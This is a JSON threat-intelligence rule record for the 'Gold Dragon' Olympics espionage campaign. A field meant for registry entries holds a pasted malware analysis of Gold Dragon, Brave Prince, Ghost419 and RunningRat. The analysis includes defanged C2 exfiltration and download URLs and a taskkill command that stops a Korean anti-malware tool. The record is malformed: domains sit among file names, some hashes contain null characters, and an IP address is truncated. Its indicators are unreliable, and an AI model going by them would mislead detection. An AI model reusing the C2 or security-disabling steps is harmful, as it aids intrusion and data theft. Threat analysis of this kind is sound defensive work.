{"rule_id": 628, "name": "Gold_Dragon_Olympics", "description": "-", "references": [], "File_Names": ["2.hwp", "HWP.exe", "PI_00.dat", "c2ae_uiproxy.exe", "000webhostapp.com", "inkboom.co", "1.hwp", "hupdate.ex", "golddragon.com", "\ud55c\uae00\ucd94\ucd9c.exe", "daumcleaner.exe", "dwrrypm.dl", "2017.pdf", "braveprince.com", "ixe000.bin", "dx.bat", "viso.exe", "byethost7.com"], "MD5_Hashes": [], "SHA1_Hashes": ["96a2fda8f26018724c86b275fe9396e24b26ec9e", "761b0690cd86fb472738b6dc32661ace5cf18893", "539acd9145befd7e670fe826c248766f46f0d041", "5e1326dd7122e2e2aed04ca4de180d16686853a7", "615447f458463dc77f7ae3b0a4ad20ca2303027a", "bc6cb78e20cb20285149d55563f6fdcf4aaafa58", "11a38a9d23193d9582d02ab0eae767c3933066ec", "fef671c13039df24e1606d5fdc65c92fbc1578d9", "06948ab527ae415f32ed4b0f0d70be4a86b364a5", "bf21667e4b48b8857020ba455531c9c4f2560740", "a9eb9a1734bb84bbc60df38d4a1e02a870962857", "389db34c3a37fd288e92463302629aa48be06e35", "465d48ae849bbd6505263f3323e818ccb501ba88", "6e13875449beb00884e07a38d0dd2a73afe38283", "7e74f034d8aa4570bd1b7dcfcdfaa52c9a139361", "4f58e6a7a04be2b2ecbcdcbae6f281778fdbd9f9", "71f337dc65459027f4ab26198270368f68d7ae77", "35e5310b6183469f4995b7cd4f795da8459087a4"], "SHA256_Hashes": [], "Registry_Entries": ["HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\nNumber of subkeys\n\n(<KeyIndex>) <KeyName>\n\nNumber of Values under each key including the parent Run key\n\n(<ValueIndex>) <Value_Name> <Value_Content>\n\nRegistry Run key enumeration by Gold Dragon.\n\nAn example of 1.hwp with registry and system information:\n\n\fGold Dragon executes these steps executed in the ex\u0000ltration process:\n\nOnce the malware has gathered the required data from the endpoint, it encrypts the data \u0000le 1.hwp using the password\n\n\u201cwww[dot]GoldDragon[dot]com\u201d\nThe encrypted content is written to the data \u0000le 1.hwp.\n\nDuring the ex\u0000ltration process, the malware Base64-encodes the encrypted data and sends it to its control server using\nan HTTP POST request to the URL:\n\nhttp://ink[dot]inkboom.co.kr/host/img/jpg/post.php\n\nHTTP data/parameters used in the request include:\n\nContent-Type: multipart/form-data; boundary=\u2014-WebKitFormBoundar ywhpFxMBe19cSjFnG <followed by base64\n\nencoded & encrypted system info>\nUser Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)\n\nAccept-Language: en-us\nHTTP Version: HTTP/1.0\n\nThe malware can also download and execute additional components served to it by the control server. The mechanism for\ndownloading additional components is based on the Computer Name and UserName of the endpoint provided by the\n\nmalware process to the control server in the following HTTP GET request:\n\nGET http://ink[dot]inkboom.co.kr/host/img/jpg/download.php?\u0000lename=\n<Computer_Name>_<username>&continue=dnsadmin\n\nAfter successfully retrieving the component from the control server, the next-stage payload is copied to the Application\n\nData directory of the current user and executed:\n\nC:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\hupdate.ex\n\n(note \u201cex,\u201d not \u201cexe\u201d)\n\n\fThe capability to download additional components from the control server.\n\n\fThe malware demonstrates its evasive behavior by checking for the presence of speci\u0000c processes related to antimalware\nproducts:\n\nThe presence of any process with the keywords \u201cv3\u201d and \u201ccleaner.\u201d\n\nChecking for antimalware or cleaner processes.\n\nIf found, these processes are terminated by sending a WM_CLOSE message to their windowing threads.\n\nTerminating an antimalware/cleaner process.\n\nBrave Prince\n\nBrave Prince is a Korean-language implant that contains similar code and behavior to the Gold Dragon variants, speci\u0000cally\nthe system pro\u0000ling and control server communication mechanism. The malware gathers detailed logs about the victim\u2019s\n\ncon\u0000guration, contents of the hard drive, registry, scheduled tasks, running processes, and more. Brave Prince was \u0000rst\nobserved in the wild December 13, 2017, sending logs to the attacker via South Korea\u2019s Daum email service. Later variants\nposted the data to a web server via an HTTP post command, in the same way that Gold Dragon does.\n\n\u00a0\n\fThe embedded domain braveprince.com.\n\nThe Daum variants of Brave Prince gather information from the system and save it to the \u0000le PI_00.dat. This \u0000le is sent as\nan attachment to the attacker\u2019s email address. Later variants upload the \u0000le to a web server via an HTTP post command.\nThe type of data this implant gathers from the victim\u2019s system:\n\nDirectories and \u0000les\nNetwork con\u0000guration\nAddress resolution protocol cache\n\nSystemcon\u0000g to gather tasks\n\nBoth variants of Brave Prince can kill a process associated with a tool created by Daum that can block malicious code. This\ntool is exclusive to South Korea.\n\ntaskkill /f /im daumcleaner.exe\n\nThe later variants of Brave Prince include the following hardcoded strings:\n\nc:\\utils\\c2ae_uiproxy.exe\nc:\\users\\sales\\appdata\\local\\temp\\dwrrypm.dl\n\nGhost419\n\nGhost419 is a Korean-language implant that \u0000rst appeared in the wild December 18, 2017, with the most recent sample\nappearing two days before the Olympics spear phishing email. The malware can be identi\u0000ed by the hardcoded string and\nURL parameter passed to the control server. Ghost419 can be traced to a sample created July 29, 2017, that appears to be\n\na much earlier version (without the hardcoded identi\u0000er). The July version shares 46% of its code with samples created in\nlate December. This early version implant creates a unique mutex value (kjie23948_34238958_KJ238742) that also appears\nin a sample from December, with the exception that one digit has changed. Ghost419 is based on Gold Dragon and Brave\nPrince implants and contains shared elements and code, especially for system reconnaissance functions.\n\nHardcoded \u201cGhost419\u201d in the malware binary.\n\nThe string \u201cWebKitFormBoundarywhpFxMBe19cSjFnG,\u201d part of the upload mechanism, also appears in the Gold Dragon\nvariants of late December 2017.\n\n\u00a0\n\fGold Dragon sample.\n\nGhost419 sample.\n\nNumerous other similarities are present in addition to system reconnaissance methods; the communication mechanism\nuses the same user agent string as Gold Dragon.\n\nGold Dragon user agent string.\n\nGhost419 user agent string.\n\nRunningRat\n\nRunningRat is a remote access Trojan (RAT) that operates with two DLLs. It gets its name from a hardcoded string\n\nembedded in the malware. Upon being dropped onto a system, the \u0000rst DLL executes. This DLL serves three main\nfunctions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence. The malware drops\nthe Windows batch \u0000le dx.bat, which attempts to kill the task daumcleaner.exe; a Korean security program. The batch \u0000le\n\nthen attempts to remove itself.\n\nThe \u0000rst DLL unpacks a resource \u0000le attached to the DLL using a zlib decompression algorithm. The authors of the\n\nmalware left the debugging strings in the binary, making the algorithm easy to identify. The second DLL is decompressed\nin memory and never touches the user\u2019s \u0000le system; this \u0000le is the main RAT that executes. Finally, the \u0000rst DLL adds the\nregistry key \u201cSysRat,\u201d at SoftWare\\Microsoft\\Windows\\CurrentVersion\\Run, to ensure the malware is executed at startup.\n\n\u00a0\n\fAfter the second DLL is loaded into memory, the \u0000rst DLL overwrites the IP address for the control server, e\u0000ectively\nchanging the address the malware will communicate with. This address is hardcoded in the second DLL as 200.200.200.13\n\nand is modi\u0000ed by the \u0000rst DLL to 223.194.70.136.\n\nThis type of behavior may indicate this code is being reused or is part of a malware kit.\n\nThe \u0000rst DLL uses one common antidebugging technique by checking for SeDebugPrivilege.\n\nOnce the second DLL is executed, it gathers information about the victim system\u2019s setup, such as operating system\nversion, and driver and processor information.\n\n\fThe malware initiates its main function of capturing user keystrokes and sending them to the control server using\nstandard Windows networking APIs.\n\nFrom our analysis, stealing keystrokes is the main function of RunningRat; however, the DLL has code for more extensive\nfunctionality. Code is included to copy the clipboard, delete \u0000les, compress \u0000les, clear event logs, shut down the machine,\nand much more. However, our current analysis shows no way for such code to be executed.\n\n\fMcAfee ATR analysts will continue to research RunningRat to determine if this extra code is used or is possibly left over\nfrom a larger RAT toolkit.\n\nThe second DLL employs a few additional antidebugging techniques. One is the use of a custom exception handler and\n\ncode paths that are designed to generate exceptions.\n\n\fThere are also a few random empty-nested threads to slow down researchers during static analysis.\n\nThe \u0000nal antidebugging technique involves GetTickCount performance counters, which are placed within the main\nsections of code to detect any delay a debugger adds during runtime.\n\nConclusion\n\nThe PowerShell script \u0000rst discovered by McAfee ATR was delivered via a spear phishing campaign that used image\nstenography techniques to hide the \u0000rst-stage implant. (For more on steganography, see the McAfee Labs Threats Report,\nJune 2017, (https://www.mcafee.com/us/resources/reports/rp-quarterly-threats-jun-2017.pdf) page 33.)\n\nThe implants covered in this research establish a permanent presence on the victim\u2019s system once the PowerShell implant\nis executed. The implants are delivered as a second stage once the attacker gains an initial foothold using \u0000leless malware.\nSome of the implants will maintain their persistence only if Hangul Word, which is speci\u0000c to South Korea, is running.\n\nWith the discovery of these implants, we now have a better understanding of the scope of this operation. Gold Dragon,\nBrave Prince, Ghost419, and RunningRat demonstrate a much wider campaign than previously known. The persistent data\nex\u0000ltration we see from these implants could give the attacker a potential advantage during the Olympics.\n\nWe thank Charles Crawford and Asheer Malhotra for their support of this analysis.\n\nIndicators of Compromise\n\nIPs\n\n194.70.136\n\nDomains\n\n000webhostapp.com\n000webhostapp.com\n\n000webhostapp.com\nnid-help-pchange.atwebpages.com\ninkboom.co.kr\nbyethost7.com\n\nHashes\n\nfef671c13039df24e1606d5fdc65c92fbc1578d9\n\n06948ab527ae415f32ed4b0f0d70be4a86b364a5\n96a2fda8f26018724c86b275fe9396e24b26ec9e\n\n\u00a0\u00a0\n\u00a0\n\fad08a60dc511d9b69e584c1310dbd6039ac\u0000a0d\nc2f01355880cd9dfeef75c\u0000189f4a8af421e0d3\n615447f458463dc77f7ae3b0a4ad20ca2303027a\nbf21667e4b48b8857020ba455531c9c4f2560740\nbc6cb78e20cb20285149d55563f6fdcf4aaafa58\n465d48ae849bbd6505263f3323e818ccb501ba88\n\na9eb9a1734bb84bbc60df38d4a1e02a870962857\n539acd9145befd7e670fe826c248766f46f0d041\nd63c7d7305a8b2184\u0000f3b0941e596f09287aa66\n35e5310b6183469f4995b7cd4f795da8459087a4\n11a38a9d23193d9582d02ab0eae767c3933066ec\ne68f43ecb03330\u00000420047b61933583b4144585\n83706ddaa5ea5ee2c\u0000f54b7c809458a39163a7a\n\n3a0c617d17e7f819775e48f7edefe9af84a1446b\n761b0690cd86fb472738b6dc32661ace5cf18893\n7e74f034d8aa4570bd1b7dcfcdfaa52c9a139361\n5e1326dd7122e2e2aed04ca4de180d16686853a7\n6e13875449beb00884e07a38d0dd2a73afe38283\n4f58e6a7a04be2b2ecbcdcbae6f281778fdbd9f9\n389db34c3a37fd288e92463302629aa48be06e35\n71f337dc65459027f4ab26198270368f68d7ae77\n\n5a7fdfa88addb88680c2f0d5f7095220b4bb\u0000c1\n\n\uf104 Previous Article (https://securingtomorrow.mcafee.com/consumer/family-safety/kids-problem-heres/)\n\nNext Article \uf105 (https://securingtomorrow.mcafee.com/consumer/consumer-threat-notices/gdpr-basics/)\n\n\uf07c Categories: McAfee Labs (https://securingtomorrow.mcafee.com/category/mcafee-labs/) \n\uf02c Tags: \u00a0 advanced persistent threats (https://securingtomorrow.mcafee.com/tag/advanced-persistent-threats/),\ncybersecurity (https://securingtomorrow.mcafee.com/tag/cybersecurity/), endpoint protection\n(https://securingtomorrow.mcafee.com/tag/endpoint-protection/), malware\n\n(https://securingtomorrow.mcafee.com/tag/malware/)\n\nLeave a reply\n\nFacebook Comments (0) Comments (0) G+ Comments\n\n0 Comments\n\nAdd a comment...\n\nFacebook Comments Plugin\n\nSort by \n\nOldest\n\n\u00a0\n\u00a0\n\f"], "URLs": ["https://securingtomorrow.mcafee.com/2018/02/)", "https://securingtomorrow.mcafee.com/consumer/family-safety/kids-problem-heres/)", "https://securingtomorrow.mcafee.com/consumer/consumer-threat-notices/gdpr-basics/)", "https://securingtomorrow.mcafee.com/author/jessica-saavedra-morales/)", "https://securingtomorrow.mcafee.com/mcafee-", "http://ink[dot]inkboom.co.kr/host/img/jpg/download.php?", "https://www.mcafee.com/us/resources/reports/rp-quarterly-threats-jun-2017.pdf)", "https://securingtomorrow.mcafee.com/tag/endpoint-protection/),", "https://securingtomorrow.mcafee.com/tag/malware/)", "https://securingtomorrow.mcafee.com/author/ryan-sherstobito", "http://ink[dot]inkboom.co.kr/host/img/jpg/post.php"], "weight": 0.0}